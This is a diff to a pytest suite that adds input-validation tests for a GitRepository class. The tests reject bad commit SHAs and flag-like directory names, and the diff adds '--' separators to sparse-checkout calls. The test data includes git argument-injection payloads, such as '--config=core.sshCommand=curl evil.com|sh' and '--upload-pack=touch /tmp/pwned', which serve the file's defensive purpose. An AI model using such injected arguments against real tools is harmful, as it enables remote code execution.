@@ -198,6 +198,63 @@ class TestGitRepository:
                 credentials={"username": "oauth2"},
             )
 
+    @pytest.mark.parametrize(
+        "invalid_sha",
+        [
+            "--upload-pack=touch /tmp/pwned",
+            "--config=core.sshCommand=curl evil.com|sh",
+            "-c core.sshCommand=evil",
+            "not-a-hex-string",
+            "ghijkl",
+            "12345",  # too short
+            "a" * 41,  # too long
+        ],
+    )
+    def test_init_rejects_invalid_commit_sha(self, invalid_sha: str):
+        with pytest.raises(ValueError, match="Invalid commit SHA"):
+            GitRepository(
+                url="https://github.com/org/repo.git",
+                commit_sha=invalid_sha,
+            )
+
+    @pytest.mark.parametrize(
+        "valid_sha",
+        [
+            "1234567",
+            "1234567890",
+            "abcdef1234567890abcdef1234567890abcdef12",
+            "ABCDEF1234567890ABCDEF1234567890ABCDEF12",
+            "aAbBcCdD1234567890",
+        ],
+    )
+    def test_init_accepts_valid_commit_sha(self, valid_sha: str):
+        repo = GitRepository(
+            url="https://github.com/org/repo.git",
+            commit_sha=valid_sha,
+        )
+        assert repo._commit_sha == valid_sha
+
+    @pytest.mark.parametrize(
+        "invalid_dir",
+        [
+            "--config=core.sshCommand=curl http://evil.com|sh",
+            "--upload-pack=evil",
+        ],
+    )
+    def test_init_rejects_directories_starting_with_double_dash(self, invalid_dir: str):
+        with pytest.raises(ValueError, match="Invalid directory"):
+            GitRepository(
+                url="https://github.com/org/repo.git",
+                directories=[invalid_dir],
+            )
+
+    def test_init_accepts_valid_directories(self):
+        repo = GitRepository(
+            url="https://github.com/org/repo.git",
+            directories=["src", "tests", "-flag-like-dir", "path/to/dir"],
+        )
+        assert repo._directories == ["src", "tests", "-flag-like-dir", "path/to/dir"]
+
     def test_init_with_name(self):
         repo = GitRepository(url="https://github.com/org/repo.git", name="custom-name")
         assert repo._name == "custom-name"
@@ -315,7 +372,7 @@ class TestGitRepository:
                 ]
             ),
             call(
-                ["git", "sparse-checkout", "set", "dir_1", "dir_2"],
+                ["git", "sparse-checkout", "set", "--", "dir_1", "dir_2"],
                 cwd=Path.cwd() / "repo",
             ),
         ]
@@ -349,7 +406,7 @@ class TestGitRepository:
                 cwd=Path.cwd() / "repo",
             ),
             call(
-                ["git", "sparse-checkout", "set", "dir_1", "dir_2"],
+                ["git", "sparse-checkout", "set", "--", "dir_1", "dir_2"],
                 cwd=Path.cwd() / "repo",
             ),
             call(["git", "pull", "origin", "--depth", "1"], cwd=Path.cwd() / "repo"),
